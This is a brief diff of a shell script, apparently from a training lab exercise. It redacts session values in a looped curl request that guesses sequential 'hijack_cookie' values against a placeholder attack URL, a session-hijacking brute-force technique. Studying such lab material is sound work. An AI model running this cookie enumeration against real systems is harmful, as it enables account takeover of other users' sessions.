@@ -11,7 +11,7 @@ curl '(url attack)'   \
 -H 'Sec-Fetch-Dest: empty'   \
 -H 'Referer: (url attck)'   \
 -H 'Accept-Language: en-US,en;q=0.9'   \
--H "Cookie: JSESSIONID=lJYoqNhLXYNXerN1RmpWkSATcIxXNcTbIiuyWfsL; hijack_cookie=7539973388127616389-"$i""   \
+-H "Cookie: JSESSIONID=..........................; hijack_cookie=..................-"$i""   \
 --data-raw 'username=&password='   \
 --compressed
 done
